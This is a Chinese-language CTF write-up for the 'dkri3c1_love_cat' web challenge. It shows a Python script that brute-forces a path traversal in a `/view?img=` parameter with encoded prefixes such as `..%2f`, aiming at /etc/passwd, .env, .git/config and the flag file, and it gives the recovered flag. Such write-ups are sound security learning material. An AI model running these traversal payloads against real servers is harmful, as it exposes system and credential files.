##### tags: `NoHackNoCTF_2025`
# No Hack No CTF 2025 Web : dkri3c1_love_cat

<style>
.red {
  color: red;
}
.blue {
  color: blue;
}
.purple {
  color: #7D3382;
}
.light_purple {
  color: #810cf5;
}
</style>

<span class=""></span>

## <span class="red">題目</span>

- ![image](https://hackmd.io/_uploads/SJ1Npw8Sxe.png)

## <span class="red">解題過程</span>

1. **一題看起來應該是黑箱 path traversal 題，原因是可以利用 `/view?img=...` 去檢視圖片，那就有機會利用像是 `../../` 之類的方式去 path traversal**

- ![image](https://hackmd.io/_uploads/SJaiTDUHlg.png)

&emsp;

2. **規則有說不能拿自動化工具掃描，那只能自己寫 script 了**

    ```python=
    import requests

    host = 'http://chal.78727867.xyz:1234//view?img='
    common_files = [
        'app.py', '_app.py', 'app.py~', 'app.py.bak',
        'app/app.py', 'app/_app.py', 'app/app.py~', 'app/app.py.bak',
        'src/app.py', 'src/_app.py', 'src/app.py~', 'src/app.py.bak',
        'main.py', 'server.py', 'index.py', 'source.py',
        'flag', 'flag.txt', 'FLAG', 'FLAG.TXT',
        'Flag', 'Flag.txt',
        'banana', 'banana.txt', 'banana.png',
        'config.py', 'settings.py', 'web.py',
        "/etc/passwd", "/etc/hostname", "/windows/win.ini"
        'README.md', '.env', '.git/config',
    ]
    prefixes = [
        #"../", "../../", "../../../", "../../../../",
        "..%2f", "..%2f..%2f", "..%252f", "....//", "..././"
    ]
    exploitation_res = []

    for depth in range(1, 4):
        success = False

        for skip_path in prefixes:
            prefix = skip_path * depth

            for fname in common_files:
                url = host + prefix + fname
                r = requests.get(url)
                if r.status_code == 200:
                    print(f'[+] Found: with {prefix}{fname}')
                    print(r.text[:300])
                    exploitation_res.append(prefix + fname)
                    success = True
                    #break
                else:
                    print(f'[-] with {prefix}{fname}: {r.status_code}')

            #if success:
            #    break

        #if success:
        #    break

        if (not success) and depth == 3:
            print("GG not found app.py or Flag")

    for i in exploitation_res:
        print(i)
    ```
    
&emsp;

3. **在將 `...` 替換為 `..%2f/etc/passwd` 就已經出現成功訊息，這證明了確實存在 path traversal 的漏洞，繼續等待結果就能發現有 `app.py` 以及 `flag.txt`**

- **`app.py` :**
    - ![image](https://hackmd.io/_uploads/HyxZyOLHle.png)

- **`flag.txt` :**
    - ![image](https://hackmd.io/_uploads/HJ0XJ_IBeg.png)

- **flag🚩 :`NHNC{dkri3c1_Like_Cat_oUo_>_<_c8763}`**

&emsp;

## <span class="red">心得</span>

1. **檢查 `app.py` 就能知道因為 code 將 `../` 替換為空字串了，所以用 `../` 作為 payload 就會出現 404**

- **`app.py` :**
    - ![image](https://hackmd.io/_uploads/rkAzl_UBll.png)
